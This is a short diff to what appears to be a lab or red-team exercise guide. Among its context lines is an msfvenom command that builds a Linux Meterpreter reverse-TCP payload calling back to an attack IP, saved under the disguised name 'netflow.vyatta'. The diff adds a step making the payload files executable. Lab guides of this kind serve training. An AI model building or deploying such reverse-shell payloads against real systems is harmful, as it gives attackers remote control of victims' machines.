@@ -248,6 +248,11 @@ In the same directory on your Attack box, run the following command. The payload
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<your attack IP> LPORT=6342 -f elf > netflow.vyatta
 ```
 
+Make the two files executable
+```bash
+chmod +x netflow.palo netflow.vyatta
+```
+
 
 - Now that you are fully set up, move to Phase 1.
 
